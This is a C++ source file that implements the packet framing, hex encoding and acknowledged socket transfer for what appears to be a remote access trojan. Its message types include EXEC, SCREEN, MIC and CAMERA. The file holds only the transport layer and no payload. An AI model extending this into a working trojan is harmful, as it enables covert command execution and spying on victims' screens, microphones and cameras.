#include <ratsignal.hpp>

//########################################################################################
//########################################################################################

// convert a string into a hex string
std::string RatPacketUtils::ToHex(const std::string& input) {
    std::ostringstream oss;
    for (unsigned char c : input) {
        oss << std::hex << std::uppercase << std::setw(2) << std::setfill('0') << (int)c;
    }
    return oss.str();
}

// convert hex string to string
std::string RatPacketUtils::FromHex(const std::string& hex) {
    std::string str;

    for (size_t i = 0; i < hex.size(); i += 2) {
        // fetch hex byte : 0xA1 and convert it into ascii
        std::string byteString = hex.substr(i, 2);
        char byte = static_cast<char>(std::stoi(byteString, nullptr, 16));
        str += byte;
    }

    return str;
}

// take a hex string and reformat it into a readable string
// for debugging in: cout, cerr, printf, etc
std::string RatPacketUtils::FormatHex(const std::string& input) {
    std::ostringstream oss;
    oss << std::hex << std::setfill('0');
    for (unsigned char c : input) {
        oss << "\\x" << std::setw(2) << static_cast<int>(c);
    }
    return oss.str();
}

// check if data sent has been acknowledged
bool RatPacketUtils::Ack(const SOCKET& sock) {
    char buffer[16] = {0};
    int bytesReceived = recv(sock, buffer, sizeof(buffer), 0);
    return (bytesReceived > 0);
}

// after recv'ing data send an ack signal
bool RatPacketUtils::SendAck(const SOCKET& sock) {
    const char* ackMsg = "ack";
    int bytesSent = send(sock, ackMsg, static_cast<int>(std::strlen(ackMsg)), 0);
    return (bytesSent > 0);
}

// send a packet to a socket target and return whether or not the send was successful
bool RatPacketUtils::Send(const SOCKET& sock, const RatPacket& packet) {
    if (sock != INVALID_SOCKET) {
        // send frame size so recv-end can prepare
        try {
            std::string data = std::to_string(packet.SizeOf());
            // to stop potential race-conditions with multiple sends
            // we should ack every send
            int bytesSent = send(sock, data.c_str(), static_cast<int>(data.size()), 0);

            if (bytesSent == SOCKET_ERROR || bytesSent <= 0) {
                std::cerr << "[-] Error occurred when sending." << std::endl;
                return false;
            }

            // after sending the expected packet size get signaled to send the frame
            // (enter recv state)
            if (!Ack(sock)) {
                std::cerr << "[-] Error Acknowledging expected size data!" << std::endl;
                return false;
            }
        } catch (const std::exception& e) {
            std::cerr << "[-] Exception Error sending expected size!" << std::endl;
            std::cerr << "[-] " << e.what() << std::endl;
            return false;
        }

        // send frame
        try {
            int totalBytesSend = 0;
            int bytesSent = 0;

            while (totalBytesSend < packet.SizeOf()) {
                // save temp string value from Frame() to safely use c_str*
                std::string data = packet.Frame();
                bytesSent = send(sock, data.c_str(), packet.SizeOf(), 0);

                if (bytesSent == SOCKET_ERROR || bytesSent <= 0) {
                    std::cerr << "[-] Error occurred when sending." << std::endl;
                    return false;
                }

                totalBytesSend += bytesSent;
            }

            return true;
        } catch (const std::exception& e) {
            std::cerr << "[-] Exception Error sending packet data!" << std::endl;
            std::cerr << "[-] " << e.what() << std::endl;
            return false;
        }
    }

    std::cerr << "[-] Socket is not Valid!" << std::endl;
    return false;
}

// recieve a rat-packet | bool pair where the bool represents whether or not a packet was recieved
std::pair<RatPacket,bool> RatPacketUtils::Recv(const SOCKET& sock) {
    if (sock != INVALID_SOCKET) {
        int expectedSize = -1;

        // recv expected frame size
        try {
            // very large numbers are not expected
            char buffer[16] = {0};
            int bytesReceived = recv(sock, buffer, sizeof(buffer), 0);

            if (bytesReceived > 0) {
                std::string sizeStr = std::string(buffer, bytesReceived);
                expectedSize = std::stoi(sizeStr);

                // send an ack to signal were ready to recv the frame
                // (enters send state)
                if (!SendAck(sock)) {
                    std::cerr << "[-] Error occurred when sending Ack!" << std::endl;
                    return std::make_pair(RatPacket(), false);
                }
            } else {
                std::cerr << "[-] Expected data length Invalid!" << std::endl;
                return std::make_pair(RatPacket(), false);
            }
        } catch (const std::exception& e) {
            std::cerr << "[-] Exception Error recieving expected data length!" << std::endl;
            std::cerr << "[-] " << e.what() << std::endl;
            return std::make_pair(RatPacket(), false);
        }

        // recv frame data
        if (expectedSize >= 0) {
            try {
                std::vector<char> buffer = {0};
                buffer.resize(expectedSize);
                int totalRecvBytes = 0;

                while (totalRecvBytes < expectedSize) {
                    int remainingBytes = expectedSize - totalRecvBytes;
                    int bytesReceived = recv(sock, buffer.data() + totalRecvBytes, remainingBytes, 0);
                
                    if (bytesReceived <= 0) {
                        std::cerr << "[-] Error recieving packet data!" << std::endl;
                        return std::make_pair(RatPacket(), false);
                    }

                    totalRecvBytes += bytesReceived;
                }
                std::string data(buffer.data());
                if (data.length() > expectedSize) {
                    // remove trailing garbage
                    data = data.substr(0, expectedSize);
                }
                return std::make_pair(RatPacket(data), true);
            } catch (const std::exception& e) {
                std::cerr << "[-] Exception Error recieving packet data!" << std::endl;
                std::cerr << "[-] " << e.what() << std::endl;
                return std::make_pair(RatPacket(), false);
            }
        } else {
            std::cerr << "[-] Expected incoming data length unknown!" << std::endl;
            return std::make_pair(RatPacket(), false);
        }
    }
    
    return std::make_pair(RatPacket(), false);
}

//########################################################################################
//########################################################################################

RatPacket::RatPacket(): msg(""), type(MsgType::NONE), size(0), corrupted(false) {}

RatPacket::RatPacket(std::string content, MsgType msgType): msg(content), type(msgType), corrupted(false) {
    size = (unsigned int)content.size();
}

RatPacket::RatPacket(const RatPacket& rhs) {
    size = rhs.size;
    type = rhs.type;
    msg = rhs.msg;
    corrupted = rhs.corrupted;
}

RatPacket::RatPacket(const std::string frame) {
    bool isValid = Validate(frame);

    if (isValid) {
        // extract frame segments
        std::vector<std::string> segments;
        std::string segment;

        for (size_t i = 2; i < frame.size()-2; ++i) {
            // fetch hex byte
            std::string byteString = frame.substr(i, 1);
            
            if (byteString == "\x7C") { // delimiter hit
                if (!segment.empty()) segments.push_back(segment);
                segment.clear();
                continue;
            } else {
                segment += byteString;
            }
        }

        if (segments.size() == 3) {
            // mark the packet info
            try {
                size = std::stoi(RatPacketUtils::FromHex(segments[0]));
                type = (MsgType)std::stoi(RatPacketUtils::FromHex(segments[1]));
                msg = RatPacketUtils::FromHex(segments[2]);
                corrupted = false;
            } catch (const std::exception& ex) {
                std::cerr << "[-] Exception: " << ex.what() << std::endl;
                corrupted = true;
            }
        } else {
            std::cerr << "[-] Error extracting segments!" << std::endl;
            corrupted = true;
        }
    } else {
        std::cerr << "[-] Invalid frame data!" << std::endl;
        corrupted = true;
    }
}

bool RatPacket::Validate(const std::string& frame) const {
    std::string start = frame.substr(0,2); // two indexes give us a hex chunk ie: \xbe\xef
    std::string end = frame.substr(frame.length()-2,2);

    bool validStart = (RatPacketUtils::FormatHex(start) == RatPacketUtils::FormatHex("\xDE\xAD"));
    bool validEnd = (RatPacketUtils::FormatHex(end) == RatPacketUtils::FormatHex("\xBE\xEF"));

    int delimitCount = 0;
    for (int i = 2; i < frame.length()-2; ++i) {
        // Each hex byte (\xA1) is a single index of the frame string
        std::string byteString = RatPacketUtils::FormatHex(frame.substr(i, 1));
        if (byteString == RatPacketUtils::FormatHex("\x7C")) ++delimitCount;
    }

    return validStart && validEnd && (delimitCount == 4);
}

std::string RatPacket::Frame() const {
    std::string frame;

    frame += "\xDE\xAD";
    frame += "\x7C"; // delimiter

    frame += RatPacketUtils::ToHex(std::to_string(size));
    frame += "\x7C"; // delimiter

    frame += RatPacketUtils::ToHex(std::to_string((int)type));
    frame += "\x7C"; // delimiter

    frame += RatPacketUtils::ToHex(msg);
    frame += "\x7C"; // delimiter
    frame += "\xBE\xEF";

    return frame;
}

void RatPacket::VisualizePacket() {
    std::string typeStr;
    switch(type) {
        case MsgType::INIT:
            typeStr = "INIT";
        break;
        case MsgType::EXEC:
            typeStr = "EXEC";
        break;
        case MsgType::SCREEN:
            typeStr = "SCREEN";
        break;
        case MsgType::MIC:
            typeStr = "MIC";
        break;
        case MsgType::CAMERA:
            typeStr = "CAMERA";
        break;
        case MsgType::NONE:
            typeStr = "NONE";
        break;
        default:
            typeStr = "UNKNOWN";
        break;
    }

    std::cout << "[ HEAD | " << size << " | " << typeStr << " | " << msg << " | TAIL ] Corrupted? " << std::boolalpha << corrupted << std::endl;
}

// gets size of packet frame for socket sending
int RatPacket::SizeOf() const {
    std::string data = Frame();
    return static_cast<int>(strlen(data.c_str()));
}
// get length of msg string
unsigned int RatPacket::Length() const {
    return (unsigned int)msg.size();
}
MsgType RatPacket::GetType() const {
    return type;
}
std::string RatPacket::GetPacketMessage() const {
    return msg;
}
bool RatPacket::IsCorrupted() const {
    return corrupted;
}

void RatPacket::SetPacketMessage(std::string nMsg) {
    if (msg == nMsg) return;
    msg = nMsg;
    size = (unsigned int)nMsg.size();
}
void RatPacket::SetType(MsgType nType) {
    if (type == nType) return;
    type = nType;
}